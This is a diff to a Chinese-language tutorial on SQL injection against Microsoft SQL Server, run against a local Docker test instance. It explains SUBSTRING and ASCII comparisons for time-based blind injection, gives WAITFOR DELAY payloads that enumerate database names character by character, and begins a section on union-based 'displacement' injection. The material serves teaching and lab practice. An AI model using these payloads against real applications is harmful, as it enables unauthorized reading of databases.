@@ -42,5 +42,93 @@ docker run -e "ACCEPT_EULA=Y" -e "SA_PASSWORD=Qwer1234" -p 1433:1433 --name ssql
 
 通过工具或配置代码，即可连接。
 
-## 判断注入点
+使用命令查看SQL Server版本
+
+```sql
+select @@version
+
+Microsoft SQL Server 2017 (RTM-CU25) (KB5003830) - 14.0.3401.7 (X64) 
+	Jun 25 2021 14:02:48 
+	Copyright (C) 2017 Microsoft Corporation
+	Developer Edition (64-bit) on Linux (Ubuntu 16.04.7 LTS)
+```
+
+
+
+## SQL注入常用函数
+
+### SUBSTRING
+
+字符截断函数：SUBSTRING(expression, start, length)  
+
+其中：
+
+* expression：需要被截断的字符，可以是字符，二进制，文本，`ntext`或图像表达式。
+* start：从第几位开始截断
+* length：需要是一个正整数，否则会报错，用来指定总共需要截断的字符长度
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210817211405.png)
+
+构造注入语句，判断是否存在注入点
+
+```
+SELECT name
+FROM sys.databases
+where database_id = 1
+IF (SUBSTRING(DB_NAME(), 1, 1) = 'm') WAITFOR delay '0:0:3';
+
+
+SELECT name
+FROM sys.databases
+where database_id = 1
+IF (SUBSTRING(DB_NAME(), 1, 1) = CHAR(109)) WAITFOR delay '0:0:3';
+```
+
+#### ASCII码半截法
+
+```
+SELECT name
+FROM sys.databases
+where database_id = 1
+IF ASCII(SUBSTRING(DB_NAME(), 1, 1)) > 30
+WAITFOR DELAY '0:0:3';
+```
+
+通过判断字符的ASCII可以枚举该字段的所有值。
+
+也可以构造子查询语句来实现SQL注入。
+
+```
+SELECT name
+FROM sys.databases
+where database_id = 1
+IF (SUBSTRING((SELECT name
+FROM sys.databases
+where database_id = 2), 3, 1)) = 'm'
+WAITFOR DELAY '0:0:3';
+```
+
+id为2的值参考上图中的结果。
+
+
+
+## 高级注入技巧——位移注入
+
+
+
+这种注入方式适合在找到表但是找不到字段的情况下使用。
+
+这种注入方式需要联合两张表，所以该注入方式也是联合查询的一种。
+
+### 原理
+
+在SQL注入中，甚至在Linux系统中，`*`表示所有。比如：
+
+```
+SELECT * FROM sys.databases;
+```
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210817220310.png)
+
+`*`在这里表示返回所有字段的所有值。
 
